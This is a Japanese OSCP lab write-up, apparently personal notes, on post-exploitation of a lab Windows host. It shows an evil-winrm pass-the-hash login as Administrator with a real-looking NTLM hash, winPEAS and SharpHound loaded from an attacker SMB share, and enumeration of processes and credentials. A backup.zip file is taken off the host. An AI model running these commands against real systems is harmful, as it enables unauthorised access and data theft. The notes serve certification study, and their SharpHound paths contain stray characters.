- 作成したユーザーkoshiで[[OSCP/OSCP/Lab_Writeup/OSCP/AD/WS26/Exploit|Exploit]]でmimikatzでローカルハッシュをダンプし、PtHでAdministratorにevil-winrmで接続
```powershell
┌──(koshi㉿kali)-[~/PEN-200/AD/WS26]
└─$ evil-winrm -i 192.168.115.206 -u 'Administrator' -H '3687f62e3dfb4b4f1fde5fe575df55d6'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

# Local

## Auto w/ WinPEAS

### 転送・実行

```zsh
# Attacker
mkdir share
cp /usr/share/peass/winpeas/winPEASx64.exe share/
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
cd ~
net use \\192.168.49.115\share /user:username pw
cp \\192.168.49.115\share\winPEASx64.exe .
.\winPEASx64.exe | Tee-Object -FilePath .\peas_admin_result.txt
```

### 実行結果抽出

```powershell

```

---
---

## Manual

### ユーザー

env
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls env:

Name                           Value
----                           -----
ALLUSERSPROFILE                C:\ProgramData
APPDATA                        C:\Users\Administrator\AppData\Roaming
CommonProgramFiles             C:\Program Files\Common Files
CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files
CommonProgramW6432             C:\Program Files\Common Files
COMPUTERNAME                   WS26
ComSpec                        C:\Windows\system32\cmd.exe
DriverData                     C:\Windows\System32\Drivers\DriverData
LOCALAPPDATA                   C:\Users\Administrator\AppData\Local
NUMBER_OF_PROCESSORS           2
OneDrive                       C:\Users\Administrator\OneDrive
OS                             Windows_NT
Path                           C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps
PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE         AMD64
PROCESSOR_IDENTIFIER           Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
PROCESSOR_LEVEL                6
PROCESSOR_REVISION             4f01
ProgramData                    C:\ProgramData
ProgramFiles                   C:\Program Files
ProgramFiles(x86)              C:\Program Files (x86)
ProgramW6432                   C:\Program Files
PSModulePath                   C:\Users\Administrator\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC                         C:\Users\Public
SystemDrive                    C:
SystemRoot                     C:\Windows
TEMP                           C:\Users\ADMINI~1\AppData\Local\Temp
TMP                            C:\Users\ADMINI~1\AppData\Local\Temp
USERDOMAIN                     WS26
USERNAME                       Administrator
USERPROFILE                    C:\Users\Administrator
windir                         C:\Windows

```

---

### システム情報


---

### ネットワーク


---

### インストール済みアプリケーション -> nothing


```powershell
*Evil-WinRM* PS C:\Users\Administrator> # Access deninedのときは、reg query "HKLM\..."
# 改行入るが結果に影響はない
$paths = @(
  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*","HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*")
Get-ItemProperty -Path $paths -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName } | Select-Object DisplayName, DisplayVersion, InstallLocation | Sort-Object DisplayName

DisplayName                                                        DisplayVersion   InstallLocation
-----------                                                        --------------   ---------------
Microsoft Edge                                                     130.0.2849.80    C:\Program Files (x86)\Microsoft\Edge\Application
Microsoft Edge WebView2 Runtime                                    130.0.2849.80    C:\Program Files (x86)\Microsoft\EdgeWebView\Application
Microsoft OneDrive                                                 24.181.0908.0001
Microsoft Update Health Tools                                      5.72.0.0
Microsoft Visual C++ 2015-2022 Redistributable (x64) - 14.32.31326 14.32.31326.0
Microsoft Visual C++ 2015-2022 Redistributable (x86) - 14.32.31326 14.32.31326.0
Microsoft Visual C++ 2022 X64 Additional Runtime - 14.32.31326     14.32.31326
Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.32.31326        14.32.31326
Microsoft Visual C++ 2022 X86 Additional Runtime - 14.32.31326     14.32.31326
Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.32.31326        14.32.31326
VMware Tools                                                       12.1.0.20219665  C:\Program Files\VMware\VMware Tools\

```

```powershell
*Evil-WinRM* PS C:\Users\Administrator> dir "C:\Program Files"


    Directory: C:\Program Files


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/9/2024   3:13 PM                Common Files
d-----          7/3/2024  11:43 PM                Internet Explorer
d-----         10/9/2024   3:59 PM                Microsoft
d-----         10/9/2024   1:32 PM                Microsoft Update Health Tools
d-----          5/6/2022  10:24 PM                ModifiableWindowsApps
d-----         10/9/2024   1:11 PM                PackageManagement
d-----         10/9/2024   3:13 PM                VMware
d-----          7/3/2024  11:43 PM                Windows Mail
d-----          7/3/2024  11:43 PM                Windows Media Player
d-----          5/7/2022  12:30 AM                Windows NT
d-----          5/7/2022  12:39 AM                Windows Photo Viewer
d-----         10/9/2024   1:11 PM                WindowsPowerShell

*Evil-WinRM* PS C:\Users\Administrator> dir "C:\Program Files (x86)"


    Directory: C:\Program Files (x86)


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/6/2022  10:42 PM                Common Files
d-----          7/3/2024  11:43 PM                Internet Explorer
d-----         10/9/2024   4:03 PM                Microsoft
d-----          5/6/2022  10:42 PM                Microsoft.NET
d-----          7/3/2024  11:43 PM                Windows Mail
d-----          7/3/2024  11:43 PM                Windows Media Player
d-----          5/7/2022  12:30 AM                Windows NT
d-----          5/7/2022  12:39 AM                Windows Photo Viewer
d-----          5/6/2022  10:42 PM                WindowsPowerShell

*Evil-WinRM* PS C:\Users\Administrator> dir ~\Downloads

```


---

### 実行中のプロセス -> nothing

- 特になし
```powershell
*Evil-WinRM* PS C:\Users\Administrator> ps | Where-Object -Property ProcessName -notin "svchost"

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    176      12    14120       2096       0.77   7116   0 agent
    265      11     4456       6356       7.70   1100   0 AggregatorHost
    151      10     5616        852       0.02    772   0 conhost
    151      10     5612       2024       0.03   2968   0 conhost
    151      10     5616       2496       0.05   5780   0 conhost
    492      23     1904       3244       0.84    516   0 csrss
    164      11     1668        656       0.11    620   1 csrss
    352      16     2844       7640       0.13   4220   1 ctfmon
    275      15     3824       3664       0.27   3744   0 dllhost
    708      26    22888       9720       1.14    604   1 dwm
     42       6     1520        504       0.05    892   0 fontdrvhost
     42       6     1500        468       0.02    896   1 fontdrvhost
      0       0       60          8                 0   0 Idle
    753      36    14776      57464       1.28   2976   1 LogonUI
   1345      34     7188       8632       5.23    760   0 lsass
      0       0      956     331024      31.05   2344   0 Memory Compression
    221      14     1900       1240       0.08   3308   0 MicrosoftEdgeUpdate
    419      24    39808       6688      10.27   4636   0 MoUsoCoreWorker
    237      14     2744       3420       0.05   4020   0 msdtc
      0      15     3072       4868       2.69     92   0 Registry
    703      19    17972       3864       6.77   2160   0 SearchIndexer
    617      15     4824       3452       5.86    724   0 services
     58       3     1068        560       0.09    380   0 smss
    406      21     5040       3540       0.06   2884   0 spoolsv
   2104       0       40        136     102.80      4   0 System
    125       7     1296       1672       0.00   4600   0 uhssvc
    177      12     2880       2332       0.03   3188   0 VGAuthService
    130       8     1452       1588       0.06   3196   0 vm3dservice
    130       9     1576       1696       0.02   3456   1 vm3dservice
    427      25    10068      11128       2.09   3212   0 vmtoolsd
    132      11     1288        840       0.09    612   0 wininit
    225      13     2448      18716       0.36    708   1 winlogon
   1418      34  4023664    3720032     864.30   3916   0 winPEASx64
   1061      27  1285700     790000     173.98   5204   0 winPEASx64
    467      22    12544       9996       9.66   3880   0 WmiPrvSE
   1969      29    90440       4384       2.89   2436   0 wsmprovhost
    552      28    65324      47904       0.83   2816   0 wsmprovhost
    542      33    66860       6764       0.97   4516   0 wsmprovhost
    515      32    67448       5556       0.50   4532   0 wsmprovhost
   1165      31    66824       4156       1.02   4712   0 wsmprovhost
```

- リアルタイムにみる（約３分みたが、特に何もなし）
	- [PowerShell-Watch](https://github.com/markwragg/PowerShell-Watch)
```zsh
──(koshi㉿kali)-[~/PEN-200/AD/WS26/share]
└─$ wget https://raw.githubusercontent.com/markwragg/PowerShell-Watch/master/Watch/Public/Watch-Command.ps1
```
```powershell
net use \\192.168.49.115\share /user:username pw
cp \\192.168.49.115\share\Watch-Command.ps1 .

*Evil-WinRM* PS C:\Users\Administrator> powershell -ep bypass -c 'import-module .\Watch-Command.ps1; ps -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -S
econds 30'
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    735      26    64260      69420       0.56    412   0 powershell
    481      26   441664     449228      56.42   3564   0 winPEASx64
    725      26    69616      76940       0.61    412   0 powershell
    721      19    18012      10124       6.81   2160   0 SearchIndexer
    356      13     2220       7028       0.09   6472   0 SearchProtocolHost
...

```

---

### PowerShellログ -> なし

```powershell
*Evil-WinRM* PS C:\Users\Administrator> (Get-PSReadlineOption).HistorySavePath
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt
*Evil-WinRM* PS C:\Users\Administrator> type 
^C
                                        
Warning: Press "y" to exit, press any other key to continue
*Evil-WinRM* PS C:\Users\Administrator> type "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt"
Cannot find path 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt' because it does not exist.
At line:1 char:1
+ type "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerS ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Admini...ost_history.txt:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\Administrator> 

```

---

### サービス


---

### スケジュールタスク


---

### 興味深い情報

ユーザーディレクトリの再帰探索→なし
```powershell
*Evil-WinRM* PS C:\Users\Administrator> ls -Path C:\Users -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          1/9/2026   7:05 PM             34 proof.txt


```

自動ログオンやリモート接続用に保存された認証情報を表示→なし
```powershell
*Evil-WinRM* PS C:\Users\Administrator> cmdkey /list

Currently stored credentials:

* NONE *
```

#### ホームディレクトリ

- backup.zipというファイルがあったため、ダウンロード
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls


    Directory: C:\Users\Administrator\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/9/2024   1:11 PM                WindowsPowerShell
-a----         10/9/2024  12:47 PM           3694 backup.zip


*Evil-WinRM* PS C:\Users\Administrator\Documents> download backup.zip
                                        
Info: Downloading C:\Users\Administrator\Documents\backup.zip to backup.zip
                                        
Info: Download successful!
```

- 鍵がかかっているため、[[OSCP/OSCP/Lab_Writeup/OSCP/AD/WS26/Exploit#Password attack|Exploit]]へ
![[Pasted image 20260110133430.png]]


---
---

# AD

## Auto w/ BloodHound

```zsh
# Attacker(作成済みのSMB共有を使う)
cp /opt/bloodhound/SharpHound.ps1 share
```
```powershell
# Target(smb共有をすでに使っているとしてnet useはスキップ)
powershell -ep bypass
net use \\192.168.49.115>\share /user:username pw
Import-Module \\192.168.49.115>\share\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory \\192.168.49.115>\share -ZipFileName 'audit.zip'
```